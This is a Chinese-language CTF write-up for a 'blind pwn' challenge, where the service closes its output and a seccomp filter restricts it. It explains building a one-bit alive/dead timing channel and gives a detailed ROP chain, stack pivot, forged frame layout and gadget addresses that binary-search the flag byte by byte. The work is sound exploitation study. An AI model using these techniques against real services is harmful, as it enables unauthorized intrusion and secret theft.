# blind pwn —— 远端版（只有 socket，没有回显、没有退出码）

## 1. 远端到底能看见什么

服务端是附件里的 `wrapper`：`read(0,...)` ← 我们的 socket，再 `write` 到子进程的 stdin 管道（60s 超时）。

blind 之后 `close(1)/close(2)` + seccomp 只放行 `read/exit/exit_group`：

* 我们再也不会收到任何**程序输出**；
* 退出码也没有任何一层帮我们回显（实测 `exit(65)` / `exit(0x62)` 都是直接 EOF）。

唯一稳定的可观测信号：

| 子进程状态 | wrapper 行为 | 我们看到的 |
|---|---|---|
| 已退出 | 下一次 `write` 到管道 → EPIPE → wrapper 退出 | **连接立刻 EOF** |
| 阻塞中 | `write` 进管道成功，wrapper 回去 `read(0,...)` | 连接保持（短窗口内无 EOF） |

于是得到 1 bit 的「活着 / 死了」信道，代价只要 1 个探针字节。

## 2. 比较原语（不用 libc，全用二进制自己的代码）

`get_input` 的循环条件本身就是一条现成的 `cmp [mem], eax`：

```
200388: mov eax, [rbp-0xc]        ; i
20038b: cmp dword [rbp-0x1c], eax ; ← 直接跳到这里
20038e: ja  0x200343              ; [rbp-0x1c] > eax → 去 read(0, [rbp-0xd], 1)
200390: jmp 0x200393              ; 否则落到 get_input 尾声
200394: mov rax,[rbp-8]; xor rax,fs:[0x28]; je leave_ret
```

* `eax` 用 **`getnum()`（0x2003aa）** 拿到：它 `read(0,15)` 后 `atoi()`，我们发 `"猜测值\n"` 就能把 eax 设成任意 0..255；
* `[rbp-0x1c]` 用 **`read(3, rbp-0x1c, 1)`** 写入 flag[idx]（先清零，只改最低字节）；
* `rbp` 用 `__libc_csu_init` 里的 `pop rbp; pop r12; pop r13; pop r14; pop r15; ret`（0x2005fb）指到 .bss 里伪造的 get_input 帧。

于是：

* **flag[idx] > guess** → 走 `ja` 分支 → `read(0, ...)`。我们只发 **1 个字节**：它读走这 1 个字节后要再读一次 → 阻塞 → **活着**；
* **flag[idx] <= guess** → 直接过 canary 检查 → `leave; ret` → 预先摆好的 `exit@plt` → **死了**。

`cmp_gt(idx, guess)` 就是一次二分，8 次二分一个字节。

> 细节：`ja` 分支每次迭代都会把读到的字节写到 `[rbp-0x18]+i`，我们把它指向 canary 槽 —— 万一循环跑完（flag 值很小）也会炸在 `__stack_chk_fail` 上；正常用 1 字节探针时循环永远停在第二次 read 上，不触发。

## 3. 帧布局（.bss，`PIE+0x601200` 起）

```
第一段(4 个 qword): pop rdi;ret | stage2 | get_input | leave;ret    (saved rbp = stage2)
        -> get_input(stage2, esi=0xc330) 把下面这坨写进 .bss，再 leave;ret 把 rsp 平移到 .bss

链 @ stage2:                             帧 @ stage2+0x300-0x20
  +0x00 pad                                frame-0x1c : flag[idx] (dword)
  +0x08 csu_read(3, scratch, idx)          frame-0x18 : frame-8       ← 读取循环的写目标
  +0x80 csu_read(3, scratch, 0)            frame-0x0c : i = 0
  +0xf8 csu_read(3, frame-0x1c, 1)         frame-0x08 : 真 canary
  +0x170 pop rbp;...;ret  -> rbp = frame   frame+0x00 : 0            ← leave 弹进 rbp
  +0x1a0 getnum()         -> eax = guess   frame+0x08 : frame+0x10   ← 死掉那支
  +0x1a8 0x20038b         -> cmp/ja        frame+0x10 : pop rdi;ret
                                           frame+0x18 : 0
                                           frame+0x20 : exit@plt
```

`csu_read` 用 `__libc_csu_init` 的 `pop 6` + `mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]`（r12 = read@got，rbp = rbx+1 防止 call 链回跳）。

## 4. 实测

本地（VM）已用这套比较原语二分出 flag（`flag{` 前缀 5 字节全对，随后完整 flag 也跑通）。

远端用法：

```bash
python3 exp_cmp.py REMOTE=127.0.0.1:36952      # 每字节 8 次比较, 每次约 2.5-3s
```

注意：远端目前（测试时）连上就 EOF —— 容器很可能被之前「故意炸 canary → abort 死循环」的探针刷满了 CPU（那批子进程会 100% 占核直到容器重启）。本脚本本身不会留下挂死进程：活着那支阻塞在 `read(0,...)`，我们断开连接后 wrapper 关管道，子进程 `read` 返回 0 → `exit(-1)` 正常退出。
